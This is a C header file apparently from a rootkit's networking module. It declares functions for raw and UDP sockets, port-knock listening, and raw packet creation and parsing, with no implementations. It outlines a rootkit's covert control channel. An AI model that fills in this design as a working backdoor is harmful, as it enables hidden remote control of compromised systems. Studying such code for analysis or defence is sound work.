#ifndef ROOTKIT_NETWORKING_H
#define ROOTKIT_NETWORKING_H

#include <utils/utils.h>
#include <sys/types.h>



// Socket creation functions
int create_udp_socket(void);
int create_raw_udp_socket(void);

// Socket binding functions
int bind_socket(int socket_fd, const struct client_options * client_options);
int bind_raw_socket(int socket_fd, char * ip_address);

// Network interface functions
char * get_local_address(void);
char * get_local_interface_name(void);

// Port knocking
int listen_port_knock(const struct client_options * client_options);

// Raw packet functions
void create_packet(int socket_fd, const char * source_ip, const char * dest_ip, int source_port, int dest_port);
void parse_raw_packet(const char *buffer, ssize_t n);


#endif //ROOTKIT_NETWORKING_H